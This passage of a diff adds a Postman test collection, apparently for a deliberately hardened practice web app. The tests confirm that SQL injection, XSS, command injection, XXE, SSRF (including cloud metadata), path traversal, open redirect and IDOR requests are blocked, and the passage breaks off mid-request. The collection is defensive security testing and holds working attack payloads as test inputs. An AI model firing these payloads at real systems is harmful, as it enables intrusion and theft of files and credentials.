+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "test' OR 1=1--"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SQLi in search blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SQLi Attempt in Login",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/auth/login",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "auth",
+                    "login"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"email\": \"admin@aegisforge.com' OR '1'='1'--\", \"password\": \"anything\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SQLi in login blocked', function () {",
+                      "    pm.expect(pm.response.code).to.equal(401);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "03 - XSS Prevention",
+          "item": [
+            {
+              "name": "XSS Attempt in Search - Sanitized",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/search?q=<script>alert('XSS')</script>",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<script>alert('XSS')</script>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XSS payload sanitized', function () {",
+                      "    pm.expect(pm.response.text()).to.not.include('<script>');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "XSS Attempt in Comment - Sanitized",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/comments",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "comments"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"comment\": \"<script>alert('XSS')</script>\"}"
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XSS payload rejected or sanitized', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Get Comments - No XSS",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/comments",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "comments"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('No XSS in response', function () {",
+                      "    pm.expect(pm.response.text()).to.not.include('<script>');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "XSS Attempt - Image Tag",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/search?q=<img src=x onerror=alert('XSS')>",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<img src=x onerror=alert('XSS')>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XSS payload sanitized', function () {",
+                      "    pm.expect(pm.response.text()).to.not.include('onerror');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "XSS Attempt - SVG",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/search?q=<svg/onload=alert('XSS')>",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "search"
+                  ],
+                  "query": [
+                    {
+                      "key": "q",
+                      "value": "<svg/onload=alert('XSS')>"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XSS payload sanitized', function () {",
+                      "    pm.expect(pm.response.text()).to.not.include('onload');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "04 - Access Control (Secure)",
+          "item": [
+            {
+              "name": "Get Own User Profile",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/{{user_id}}",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "{{user_id}}"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Status code is 200', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR Attempt - Other User - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/2",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "2"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Access denied', function () {",
+                      "    pm.expect(pm.response.code).to.equal(403);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR Attempt - Update Other User - Blocked",
+              "request": {
+                "method": "PUT",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/2",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "2"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Hacked User\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Update blocked', function () {",
+                      "    pm.expect(pm.response.code).to.equal(403);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "IDOR Attempt - Delete Other User - Blocked",
+              "request": {
+                "method": "DELETE",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/3",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "3"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Delete blocked', function () {",
+                      "    pm.expect(pm.response.code).to.equal(403);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Privilege Escalation Attempt - Blocked",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/{{user_id}}/promote",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "{{user_id}}",
+                    "promote"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"role\": \"admin\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Privilege escalation blocked', function () {",
+                      "    pm.expect(pm.response.code).to.equal(403);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Admin Panel Access - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/admin/dashboard",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "admin",
+                    "dashboard"
+                  ]
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Admin access denied', function () {",
+                      "    pm.expect(pm.response.code).to.equal(403);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "05 - Command Injection Prevention",
+          "item": [
+            {
+              "name": "Safe Ping - Valid Input",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/ping?host=127.0.0.1",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Safe execution', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Command Injection Attempt - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/ping?host=127.0.0.1; cat /etc/passwd",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1; cat /etc/passwd"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Command injection blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Command Injection with Pipe - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/ping?host=127.0.0.1 | whoami",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1 | whoami"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Command injection blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Command Injection with AND - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/ping?host=127.0.0.1 && id",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "ping"
+                  ],
+                  "query": [
+                    {
+                      "key": "host",
+                      "value": "127.0.0.1 && id"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Command injection blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "06 - XXE Prevention",
+          "item": [
+            {
+              "name": "Safe XML Parsing",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/xml"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/xml/parse",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "xml",
+                    "parse"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "\"<?xml version='1.0'?><root><data>test</data></root>\""
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XML parsed safely', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "XXE Attempt - Blocked",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/xml"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/xml/parse",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "xml",
+                    "parse"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "\"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>\""
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('XXE blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "07 - SSRF Prevention",
+          "item": [
+            {
+              "name": "Safe External Fetch",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/fetch?url=https://api.github.com",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "https://api.github.com"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Safe external fetch', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SSRF Attempt - Localhost - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/fetch?url=http://127.0.0.1:8080/admin",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://127.0.0.1:8080/admin"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SSRF blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SSRF Attempt - Internal IP - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/fetch?url=http://192.168.1.1",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://192.168.1.1"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SSRF blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SSRF Attempt - Cloud Metadata - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/fetch?url=http://169.254.169.254/latest/meta-data/",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://169.254.169.254/latest/meta-data/"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SSRF blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "SSRF Attempt - File Protocol - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/fetch?url=file:///etc/passwd",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "fetch"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "file:///etc/passwd"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('SSRF blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "08 - Open Redirect Prevention",
+          "item": [
+            {
+              "name": "Safe Redirect - Internal",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/redirect?url=/dashboard",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "/dashboard"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Safe redirect', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([302, 301, 200]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Open Redirect Attempt - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/redirect?url=http://evil.com",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "http://evil.com"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Open redirect blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "JavaScript Protocol - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/redirect?url=javascript:alert('XSS')",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "redirect"
+                  ],
+                  "query": [
+                    {
+                      "key": "url",
+                      "value": "javascript:alert('XSS')"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('JavaScript protocol blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "09 - Business Logic (Secure)",
+          "item": [
+            {
+              "name": "Withdrawal with Proper Validation",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/wallet/withdraw",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "wallet",
+                    "withdraw"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"amount\": 50}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Withdrawal processed with validation', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Negative Amount - Rejected",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/wallet/deposit",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "wallet",
+                    "deposit"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"amount\": -100}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Negative amount rejected', function () {",
+                      "    pm.expect(pm.response.code).to.equal(400);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Price Tampering - Blocked",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/orders",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"product_id\": 1, \"quantity\": 1, \"price\": 0.01}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Price tampering detected', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Valid Order",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/orders",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "orders"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"product_id\": 1, \"quantity\": 2}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Valid order created', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "10 - Information Disclosure Prevention",
+          "item": [
+            {
+              "name": "Generic Error Message",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/users/invalid",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "users",
+                    "invalid"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Generic error without sensitive info', function () {",
+                      "    pm.expect(pm.response.text()).to.not.include('stack');",
+                      "    pm.expect(pm.response.text()).to.not.include('traceback');",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Path Traversal - Blocked",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/files?file=../../../../etc/passwd",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "files"
+                  ],
+                  "query": [
+                    {
+                      "key": "file",
+                      "value": "../../../../etc/passwd"
+                    }
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Path traversal blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([400, 403, 404]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Config Endpoint - Protected",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/config",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "config"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Config endpoint protected', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([401, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Debug Endpoint - Disabled",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/debug",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "debug"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Debug endpoint disabled', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([404, 403]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "11 - CSRF Protection",
+          "item": [
+            {
+              "name": "Get CSRF Token",
+              "request": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/csrf-token",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "csrf-token"
+                  ]
+                },
+                "auth": {
+                  "type": "noauth"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('CSRF token received', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "    var jsonData = pm.response.json();",
+                      "    pm.expect(jsonData).to.have.property('csrf_token');",
+                      "    pm.collectionVariables.set('csrf_token', jsonData.csrf_token);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "POST Without CSRF Token - Blocked",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/profile",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "profile"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Updated Name\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Request without CSRF token blocked', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([403, 400]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "POST With CSRF Token - Success",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  },
+                  {
+                    "key": "X-CSRF-Token",
+                    "value": "{{csrf_token}}"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/profile",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "profile"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"name\": \"Updated Name\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Request with CSRF token succeeds', function () {",
+                      "    pm.response.to.have.status(200);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "name": "12 - File Upload (Secure)",
+          "item": [
+            {
+              "name": "Upload Valid File",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
+                    "key": "Content-Type",
+                    "value": "application/json"
+                  }
+                ],
+                "url": {
+                  "raw": "{{blue_base_url}}/api/upload",
+                  "host": [
+                    "{{blue_base_url}}"
+                  ],
+                  "path": [
+                    "api",
+                    "upload"
+                  ]
+                },
+                "body": {
+                  "mode": "raw",
+                  "raw": "{\"file\": \"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\"}"
+                }
+              },
+              "event": [
+                {
+                  "listen": "test",
+                  "script": {
+                    "exec": [
+                      "pm.test('Valid file upload', function () {",
+                      "    pm.expect(pm.response.code).to.be.oneOf([200, 201]);",
+                      "});"
+                    ],
+                    "type": "text/javascript"
+                  }
+                }
+              ]
+            },
+            {
+              "name": "Upload Malicious File - Blocked",
+              "request": {
+                "method": "POST",
+                "header": [
+                  {
